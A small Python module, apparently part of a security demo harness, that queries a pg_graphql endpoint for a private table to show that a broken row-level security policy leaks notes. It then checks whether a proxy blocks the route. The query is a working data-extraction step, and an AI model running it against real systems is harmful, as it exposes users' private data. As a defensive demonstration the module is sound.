"""GraphQL read — pull the private notes straight out through pg_graphql. RLS still applies,
so the same broken policy that leaks via REST leaks through GraphQL too.
"""
from core import gql_notes, line, proxied

PHASE = "RECON"
TITLE = "GraphQL read:  POST /graphql/v1  { privateCollection … }"


def run(ctx):
    q = {"query": "{ privateCollection { edges { node { id data } } } }"}
    d = ctx.send("POST", ctx.direct, "/graphql/v1", ctx.token, json=q)
    notes = gql_notes(d)
    line("DIRECT", d, f"LEAKED {len(notes)} notes via GraphQL: {notes}")
    p = ctx.send("POST", ctx.proxy, "/graphql/v1", ctx.token, json=q)
    line("PROXY", p, "BLOCKED — /graphql not routed" if not proxied(p) else "LEAKED via proxy?!")
